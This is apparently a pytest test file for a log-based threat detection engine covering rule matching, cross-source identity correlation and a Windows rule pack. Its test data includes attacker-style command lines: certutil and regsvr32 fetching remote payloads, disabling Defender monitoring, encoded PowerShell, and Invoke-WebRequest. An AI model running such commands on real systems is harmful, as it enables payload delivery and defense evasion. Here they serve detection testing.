from datetime import datetime, timezone
from pathlib import Path

import pytest

from core.detector import Detector
from core.event import Event
from core.identity import same_identity
from core.alerter import Alert
from core.rule_engine import Rule, RuleEngine


def make_event(timestamp: str, source: str, action: str, user: str = "alice@example.com", **details):
    return Event(
        timestamp=datetime.fromisoformat(timestamp).replace(tzinfo=timezone.utc),
        source=source, event_type="test", action=action, user=user, details=details,
    )


def test_nested_case_insensitive_conditions():
    event = make_event("2026-01-01T10:00:00", "sysmon", "process_created", command_line="PowerShell.EXE -EncodedCommand AAA")
    assert RuleEngine.matches(event, {
        "source": "sysmon",
        "conditions": {"details.command_line": {"contains_any": ["-enc", "frombase64string"]}},
    })


def test_cross_source_sequence_correlates_same_identity_in_window():
    rule = Rule(
        id="TEST-001", title="Hybrid", description="", type="correlation",
        severity="critical", sources=("entra", "windows"), attack={"id": "T1078"},
        remediation="Respond", timeframe_minutes=15, group_by="user",
        sequence=(
            {"source": "entra", "conditions": {"action": "user_sign_in"}},
            {"source": "windows", "conditions": {"action": "special_privileges_assigned"}},
        ),
    )
    events = [
        make_event("2026-01-01T10:00:00", "entra", "user_sign_in"),
        make_event("2026-01-01T10:05:00", "windows", "special_privileges_assigned"),
    ]
    alerts = Detector(RuleEngine([rule])).run(events)
    assert len(alerts) == 1
    assert alerts[0].sources == ["entra", "windows"]
    assert len(alerts[0].events) == 2


def test_cross_source_sequence_rejects_different_identity():
    rule = Rule(
        id="TEST-002", title="Hybrid", description="", type="correlation",
        severity="critical", sources=("entra", "windows"), attack={"id": "T1078"},
        remediation="Respond", timeframe_minutes=15, group_by="user",
        sequence=(
            {"source": "entra", "conditions": {"action": "user_sign_in"}},
            {"source": "windows", "conditions": {"action": "special_privileges_assigned"}},
        ),
    )
    events = [
        make_event("2026-01-01T10:00:00", "entra", "user_sign_in", "alice@example.com"),
        make_event("2026-01-01T10:05:00", "windows", "special_privileges_assigned", "bob@example.com"),
    ]
    assert Detector(RuleEngine([rule])).run(events) == []


def test_hybrid_identity_matches_sam_account_to_upn_but_not_colliding_upns():
    assert same_identity("alice", "alice@example.com")
    assert same_identity(r"CORP\alice", "alice@example.com")
    assert not same_identity("alice@one.example", "alice@two.example")


def test_cross_source_sequence_uses_normalized_hybrid_identity():
    rule = Rule(
        id="TEST-ALIAS", title="Hybrid", description="", type="correlation",
        severity="critical", sources=("entra", "windows"), attack={"id": "T1078"},
        remediation="Respond", timeframe_minutes=15, group_by="user",
        sequence=(
            {"source": "entra", "conditions": {"action": "user_sign_in"}},
            {"source": "windows", "conditions": {"action": "special_privileges_assigned"}},
        ),
    )
    events = [
        make_event("2026-01-01T10:00:00", "entra", "user_sign_in", "alice@example.com"),
        make_event("2026-01-01T10:05:00", "windows", "special_privileges_assigned", r"CORP\alice"),
    ]
    assert len(Detector(RuleEngine([rule])).run(events)) == 1


def test_event_and_alert_fingerprints_are_stable_across_upload_names():
    first = Event(timestamp="2026-01-01T10:00:00Z", source="entra", event_type="signin",
                  action="user_sign_in", user="alice@example.com", details={"risk": "high"},
                  raw={"id": "event-1"}, origin_file="a.json")
    second = Event(timestamp="2026-01-01T10:00:00Z", source="entra", event_type="signin",
                   action="user_sign_in", user="alice@example.com", details={"risk": "high"},
                   raw={"id": "event-1"}, origin_file="b.json")
    rule = Rule(id="TEST-STABLE", title="Stable", description="", type="event", severity="high",
                sources=("entra",), attack={}, remediation="Review", match={"action": "user_sign_in"})
    assert first.fingerprint() == second.fingerprint()
    assert first.id == second.id
    assert Alert.create(rule, [first]).id == Alert.create(rule, [second]).id


@pytest.mark.parametrize(
    ("rule_id", "source", "action", "details"),
    [
        ("DF-WIN-002", "sysmon", "process_created", {"parent_process": r"C:\Office\WINWORD.EXE", "process_name": r"C:\Windows\powershell.exe"}),
        ("DF-WIN-003", "windows", "process_created", {"process_name": "certutil.exe", "command_line": "certutil -urlcache -split -f https://example.invalid/a"}),
        ("DF-WIN-004", "sysmon", "process_created", {"process_name": "regsvr32.exe", "command_line": "regsvr32 /s /i:https://example.invalid/a.sct scrobj.dll"}),
        ("DF-WIN-005", "sysmon", "process_created", {"process_name": "rundll32.exe", "command_line": "rundll32 javascript:alert(1)"}),
        ("DF-WIN-006", "windows", "process_created", {"process_name": "powershell.exe", "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"}),
        ("DF-WIN-007", "windows", "audit_log_cleared", {}),
        ("DF-WIN-008", "windows", "scheduled_task_created", {}),
        ("DF-WIN-009", "windows", "user_account_created", {}),
        ("DF-WIN-010", "windows", "member_added_to_security_group", {"group_name": "Domain Admins"}),
        ("DF-WIN-011", "sysmon", "process_created", {"process_name": "powershell.exe", "command_line": "Invoke-WebRequest https://example.invalid/a"}),
    ],
)
def test_windows_rule_pack_matches_representative_event(rule_id, source, action, details):
    rules_path = Path(__file__).resolve().parents[1] / "rules"
    engine = RuleEngine.from_directory(rules_path)
    event = make_event("2026-01-01T10:00:00", source, action, **details)
    matching_ids = {
        rule.id for rule in engine.rules
        if rule.type == "event" and rule.match
        and event.source in rule.sources and engine.matches(event, rule.match)
    }
    assert rule_id in matching_ids
